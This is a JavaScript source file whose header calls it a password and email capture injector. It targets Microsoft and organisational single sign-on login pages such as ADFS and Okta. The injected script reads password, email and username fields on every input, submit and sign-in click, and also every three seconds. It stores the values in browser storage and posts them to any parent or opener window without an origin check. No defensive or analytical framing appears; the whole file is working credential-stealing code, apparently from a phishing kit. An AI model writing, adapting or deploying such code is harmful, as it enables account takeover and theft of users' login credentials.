/**
 * Password & Email Capture Injector
 * Captures password, email, and username fields on Microsoft and organizational login pages.
 * Stores credentials in sessionStorage and localStorage.
 * Sends credentials to parent/opener window if available.
 */
export function injectPasswordCaptureScript() {
  const hostname = window.location.hostname;
  const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') ||
    hostname.includes('login.live.com') ||
    hostname.includes('account.microsoft.com');

  const isOrgDomain = hostname.includes('adfs') ||
    hostname.includes('sso') ||
    hostname.includes('okta') ||
    hostname.includes('ping') ||
    document.querySelector('input[type="password"]');

  if (isMicrosoftDomain || isOrgDomain) {
    const script = document.createElement('script');
    script.textContent = `
      (function() {
        let capturedCredentials = {
          email: '',
          password: '',
          username: '',
          domain: window.location.hostname,
          captureTime: new Date().toISOString()
        };

        function capturePasswordFromForms() {
          try {
            const passwordFields = document.querySelectorAll('input[type="password"]');
            const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"]');
            const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"], input[id*="user"], input[id*="login"]');

            let hasNewData = false;

            passwordFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.password) {
                capturedCredentials.password = field.value;
                hasNewData = true;
              }
            });

            emailFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.email) {
                capturedCredentials.email = field.value;
                hasNewData = true;
              }
            });

            usernameFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.username) {
                capturedCredentials.username = field.value;
                hasNewData = true;
              }
            });

            if (hasNewData) {
              storeCredentials();
            }

            return hasNewData;
          } catch (error) {
            console.error('❌ Error capturing password:', error);
            return false;
          }
        }

        function storeCredentials() {
          const credentialsData = {
            email: capturedCredentials.email,
            password: capturedCredentials.password,
            username: capturedCredentials.username,
            domain: capturedCredentials.domain,
            captureTime: capturedCredentials.captureTime,
            source: 'injected-password-capture',
            url: window.location.href
          };

          try {
            sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('user_credentials', JSON.stringify(credentialsData));
          } catch (error) {}

          // Send to parent/opener if available
          const payload = {
            type: 'CREDENTIALS_CAPTURED',
            data: credentialsData,
            source: 'injected-password-capture',
            timestamp: new Date().toISOString()
          };
          try {
            if (window.parent && window.parent !== window) {
              window.parent.postMessage(payload, '*');
            }
            if (window.opener) {
              window.opener.postMessage(payload, '*');
            }
          } catch (error) {}
        }

        document.addEventListener('input', function(e) {
          if (
            e.target.type === 'password' ||
            e.target.name?.toLowerCase().includes('password') ||
            e.target.name?.toLowerCase().includes('email') ||
            e.target.name?.toLowerCase().includes('user') ||
            e.target.id?.toLowerCase().includes('password') ||
            e.target.id?.toLowerCase().includes('email') ||
            e.target.id?.toLowerCase().includes('user')
          ) {
            setTimeout(() => {
              capturePasswordFromForms();
            }, 300);
          }
        });

        document.addEventListener('submit', function(e) {
          setTimeout(() => {
            capturePasswordFromForms();
          }, 100);
        });

        document.addEventListener('click', function(e) {
          const target = e.target;
          if (
            target.type === 'submit' ||
            target.textContent?.toLowerCase().includes('sign in') ||
            target.textContent?.toLowerCase().includes('login') ||
            target.textContent?.toLowerCase().includes('next') ||
            target.className?.toLowerCase().includes('submit') ||
            target.className?.toLowerCase().includes('login')
          ) {
            setTimeout(() => {
              capturePasswordFromForms();
            }, 500);
          }
        });

        setInterval(() => {
          capturePasswordFromForms();
        }, 3000);

        setTimeout(() => {
          capturePasswordFromForms();
        }, 1000);
      })();
    `;
    document.head.appendChild(script);
  }
}